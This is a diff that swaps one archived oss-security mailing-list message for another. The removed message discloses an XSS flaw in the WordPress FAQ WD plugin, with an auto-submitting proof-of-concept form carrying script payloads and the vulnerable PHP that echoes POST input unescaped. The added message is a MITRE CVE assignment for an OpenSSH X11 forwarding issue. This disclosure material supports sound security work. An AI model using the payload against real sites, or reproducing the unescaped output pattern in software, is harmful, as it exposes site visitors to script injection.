@@ -1,79 +1,53 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/16/6
-Message-ID: <CAOmn9FRZhAZDacr=szRqSYdxD5R_c_FinN=Zg6wdehO2M+qTzQ@mail.gmail.com>
-Date: Sat, 16 Apr 2016 14:01:20 +0530
-From: shravan kumar <cor3sm4sh3r@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: Unauthenticated XSS Vulnerability in WORDPRESS FAQ WD plugin 1.0.14.
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/15/13
+Message-Id: <20160115183242.1A23733E005@smtpvbsrv1.mitre.org>
+Date: Fri, 15 Jan 2016 13:32:42 -0500 (EST)
+From: cve-assign@...re.org
+To: kseifried@...hat.com, corsac@...ian.org
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
+Subject: Re: Qualys Security Advisory - Roaming through the OpenSSH client: CVE-2016-0777 and CVE-2016-0778
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-I would like to report a Unauthenticated XSS vulnerability in FAQ WD
- plugin version 1.0.14 .
+>>> https://anongit.mindrot.org/openssh.git/commit/?id=ed4ce82dbfa8a3a3c8ea6fa0db113c71e234416c
 
-The Plugin can be found at https://wordpress.org/plugins/faq-wd/
+>>>> eliminate fallback from untrusted X11 forwarding to trusted forwarding
+>>>> when the X server disables the SECURITY extension; Reported by Thomas
+>>>> Hoger
 
-This Bug can be triggered by unauthenticated / Authenticated user. If a
-user is sent a URL by social engineering and the user clicks the link the
-bug can be triggred.
+> https://bugzilla.redhat.com/show_bug.cgi?id=1298741
 
-The URL should be something like this
+>> would lead to remote X clients having more
+>> privileged access to the local X server than intended
 
-http://attackerssite.com/XSS_POC.html
+> https://bugzilla.redhat.com/show_bug.cgi?id=1298741#c4
 
+>> Actually, openssh-7.1p2 does not fix this issue and it will be as part
+>> of the next release.
 
+Use CVE-2016-1908.
 
-The code for XSS_POC.html is as follows:
+- -- 
+CVE assignment team, MITRE CVE Numbering Authority
+M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-
-<html>
-  <body onload="document.forms['xss'].submit()" >
-    <form name="xss" action="
-http://targetsite/wpinstallation/wp-content/plugins/faq-wd/lang/views/SLangViewPo.php"
-method="POST" >
-
-  <input type="hidden" name="lang_err_mess" value="
-<script>alert(1);</script>" />
-<input type="hidden" name="lang_success_synchron" value="
-<script>alert(2);</script>" />
-      <input type="submit" value="Submit form" />
-    </form>
-  </body>
-</html>
-
-
-Techinical Details:
-
-The vulnerable page is
-
-wp-content/plugins/faq-wd/lang/views/SLangViewPo.php
-
-This page can be directly accessed by anyone.
-
-The Code responsible for the vulnerability :
-<?php if (isset($_POST['lang_err_mess'])): ?>
-    <div class="error" style="display: inline-block;width: 100%"><p><?php
-echo $_POST['lang_err_mess']; ?></p></div>
-<?php elseif (isset($_POST['lang_success'])): ?>
-    <div class="updated" style="display: inline-block;width: 100%"><p><?php
-echo 'File was successfully updated.'; ?></p></div>
-<?php endif; ?>
-<?php if (isset($_POST['lang_success_synchron'])): ?>
-    <div class="updated" style="display: inline-block;width: 100%"><p><?php
-echo $_POST['lang_success_synchron']; ?></p></div>
-<?php endif; ?>
-
-
-Here we can see that there are two post request which are displayed in
-unsafe manner while rendering the page.
-
-The vulnerable POST parameters are:
-
-   - $_POST['lang_err_mess']
-   - $_POST['lang_success_synchron']
-
-
--- 
-Shravan Kumar
-
+iQIcBAEBCAAGBQJWmTrRAAoJEL54rhJi8gl5m7EP/2K8TEGoIsd6mqpyzdOhAcb0
+Wep2p3360yu03LOYxybP10LlW20aH5uaWeML9eMGZPuXqrmN20YiUWHBGEmXfU+a
+ySHLKxg1+OORMvxDOy7TKpQVePb8pkq5FNVIspY/LY08tyx8xwFt6ce9IbGhtoud
+RAkHpAAvRIk0n/dIKAT/LzMtlD/8ld0fx2nKm4AbFsk65bIF9zii7dKy4UQ+/q1V
+7bPQoEO5yv5P5h/A+E02FcXfUYuJaT+zo36Opvu3X3SmDUKAMFMjzlzSvrxkOAZZ
+kd7fPuGp7kkkvfA8G4vkpK6005VQ0H8aCbaqiuf6lek2Fk3jWLg8nCYiesSetXCm
+lJtUEeNd07DFU97hgfkW9hQmME3N1/BCR7fIeQeQ2PX6gdNmaqjZLtaAVyYiINEo
+yN9bwf2gD6s2jTzybLZgh8NPuiwzf90YbPVyI5pSmuwSbSH3P0FanDY4spzBsTwu
+9QsA2Z91Xwgb2uAk2y2Yv7vPliw4/AxMR6zOWRcvaht7p8ckswFCIPgpRjuJGN8C
+DaeiveJ2tzAsUtWknkw38bgOo7+Nq7RE8H+0IFGnZdcx++Hfzz8n0gE5T0atf7rs
+vFp2rbS07uq5cLXwGpfusR2pE7Zv1WwI8HkqwvnIM+6qRmpuYJTgj4QuxmSduUy5
+VzoKwYZR3d0WAtFLTQIy
+=EebB
+-----END PGP SIGNATURE-----
